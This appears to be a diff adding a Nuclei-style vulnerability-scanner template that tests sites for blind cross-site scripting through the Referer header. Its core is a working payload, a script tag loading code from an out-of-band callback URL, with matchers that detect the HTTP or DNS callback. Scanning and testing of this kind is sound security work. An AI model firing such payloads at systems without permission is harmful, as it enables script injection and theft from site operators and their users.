@@ -1,0 +1,22 @@
+id: blind-xss-referer
+info:
+  name: Blind XSS in Referer
+  author: WhiteFatalis
+  severity: high
+  description: Injects a blind XSS payload into the Referer header.
+  tags: xss, blind
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Referer: "https://trusted.com/\"><script src=//{{interactsh-url}}></script>"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
